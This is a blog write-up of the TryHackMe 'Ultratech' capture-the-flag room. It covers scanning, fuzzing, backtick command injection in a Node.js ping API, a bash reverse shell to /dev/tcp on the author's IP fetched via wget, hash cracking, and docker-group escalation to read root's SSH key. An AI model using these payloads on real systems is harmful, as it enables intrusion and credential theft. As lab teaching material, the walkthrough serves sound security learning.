---
title: Ultratech | Tryhackme writeup
date: 2022-05-08 18:30:00 +0200
categories: [Blog, Writeup]
tags: [writeup, tryhackme, pentesting, penetration, testing, hacking, ethical, Ultratech, docker privesc, enumeration, nodejs service, easy password cracking, medium]
comments: false

---



This is my writeup for **Ultratech** room from Tryhackme, it' a Medium difficulty room and it covers the following :
- User enumeration
- Fuzzing
- Nodejs API command injection
- Credential cracking
- Docker group privilege escalation

# Scanning

When doing the usual **Nmap** scan i get 4 open ports, 21 and 22 are the usual ones for **ftp** and **ssh**, but i dont know what the other two are so i run 
**Nmap** again but this time with **-sCV** options to know the services and versions of that ports.

![First Nmap scan for open ports](/assets/img/ultratech/001.png)
_Nmap scanning for open ports_

![Second Nmap scan for versions](/assets/img/ultratech/002.png)
_**-sCV** scan to know version and service of ports 31331 8081_

The ports finally are **Apache** http for 31331 and **Node** for 8081.

Im running **whatweb** in parallel to know what technologies the webs have.
![Web scanning with watweb](/assets/img/ultratech/003.png)
_Web scanning with whatweb_
I don't find nothing interesting so now i'm going to visit the port 31331 web first and see what i can find.

The're is a section of the web diplaying the members working on the project and their nicknames and these nicknames may be usernames for login so i save them.
![Members section web](/assets/img/ultratech/004.png)
_Potential usernames_

## Fuzzing
I can't find anything else so i'm going to start fuzzing the 31331 port website.
I'm using wfuzz with a short dictionary of routes, and the results are as follows:
![Fuzzing 1](/assets/img/ultratech/005.png)
_Fuzzing 31331 route_
Im checking **robots.txt** first and this is interesting because there's a route to another .txt inside.
```
utech_sitemap.txt
```
When checking this txt three routes are displaying, two of them are the ones that i previously saw when inspecting the web, but the third one is new.
```
/index.html
/what.html
**/partners.html**
```
Inside /partners.html there's a login panel.

![Hidden login panel](/assets/img/ultratech/006.png)
_Login panel inside partners.html_
Trying random credentials redirects me to port 8081/auth route saying Invalid login.

Checking the other routes i got when fuzzing, i see this api.js interesting file inside /js folder.
![api.js source code](/assets/img/ultratech/007.png)
_/js/api.js source code_

# Gaining access
The line in red is the most interesting to me, i think that maybe i can inject commands there.
I tried the following:
- http://IP/ping?ip=MYIP \| whoami (didn't work)
- http://IP/ping?ip=MYIP ; whoami (didn't work)(; got removed)
- http://IP/ping?ip= 'whoami' (didn't work)
- http://IP/ping?ip= \`whoami\` (**WORKS**)

_(The idea of using `` came to my mind looking at the code i saw earlier and some NodeJs examples that i found online)_

With this i have Remote Command Execution and i can work getting a reverse shell.
Sadly i can't get a reverse shell from the search bar with various methods so I script this:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.8.70.95/443 0>&1'
```
And now i can get this script by tarting a python http server:

```bash
python3 -m http.server 80
```
and launching wget to the script route.
```
http://MACHINEIP/ping?ip=`http://MYIP/script.sh`
```
It worked!
![wget worked](/assets/img/ultratech/008.png)
_wget Completed: response 200 OK_
Now i could do **bash script.sh**, but i did **ls** before and there is a sqlite backup i didn't see earlier.
There are two hashes there, one of them for one of the names in the website.
![sqlite backup contents](/assets/img/ultratech/009.png)
_Two hashes inside the sqlite backup_
Cracking the hashes in crackstation.net gives me the passwords:
![Hash 1 cracked](/assets/img/ultratech/010.png)
_Hash 1 cracked_
![Hash 2 cracked](/assets/img/ultratech/011.png)
_Hash 2 cracked_

Now im quickly trying the credentials in the login page from before. Both of them gives me the same result:
![Message behind the login](/assets/img/ultratech/012.png)
_Message from a dev to the user i had from before_

I didn't know what to do, reading the message i randomly tought that maybe he wants me to login into the server, so i tried to login with the credentials i had into ssh and it worked!

![Access gained](/assets/img/ultratech/013.png)
_Access gained as non-privileged user_
# Privilege escalation
First time i do is **id** and i see this output:
![id output](/assets/img/ultratech/014.png)
_id output_

My user has docker permissions so maybe i can mount machine's / into the container as root.

Doing this i see that there's an image called **bash**:
```bash
docker images
```

So now i can do this to mount / , run the container as root and then launch **sh**:
```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

![Privesc to root into the container](/assets/img/ultratech/015.png)
_Privesc to root into the container_

Because the whole filesystem is mounted into my container, i can access everything outside the container from the inside.
The last task asks me to get the first characters from root's id_rsa, and i found it into /root/.ssh/id_rsa:

![Content of root's id_rsa](/assets/img/ultratech/015.png)
_Root's private ssh key_

I could create a new superuser for persistence or change root's password as we can access and edit /etc/shadow and /etc/password,
but as this is a ctf and i completed all the tasks, this ends here for me. Pretty interesting room 😊

Thanks for reading, have a happy hacking!


